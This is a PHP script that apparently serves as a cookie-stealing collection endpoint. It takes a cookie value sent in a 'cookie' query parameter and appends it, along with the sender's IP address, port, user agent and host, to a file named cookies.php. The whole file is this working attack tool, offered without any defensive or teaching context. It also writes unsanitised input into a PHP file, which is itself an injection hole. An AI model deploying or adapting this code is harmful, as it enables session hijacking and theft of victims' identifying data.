<?php
    if(isset($_GET['cookie'])) {
        $arr = array('HTTP_HOST', 'HTTP_USER_AGENT', 'SERVER_NAME', 'REMOTE_ADDR', 'REQUEST_METHOD', 'REMOTE_PORT');
        
        $file = fopen('cookies.php', 'a+');
       
        $dataToWrite = "<table><tr><th>Host</th><th>User Agent</th><th>Server Name</th><th>Remote Addr</th><th>Request Method</th><th>Remote Port</th><th>Cookie</th><tr>";

        foreach($arr as $property){
            $data = '<td>'. $_SERVER[$property] . '</td>';
            $dataToWrite .= $data;
        }

        $dataToWrite .= '<td>' . $_GET['cookie'] . '</td></tr></table><hr>';

        fwrite($file, $dataToWrite . PHP_EOL);
        fclose($file);

        echo 'OK';
    }
    else{
        die('FAIL');
    }
?>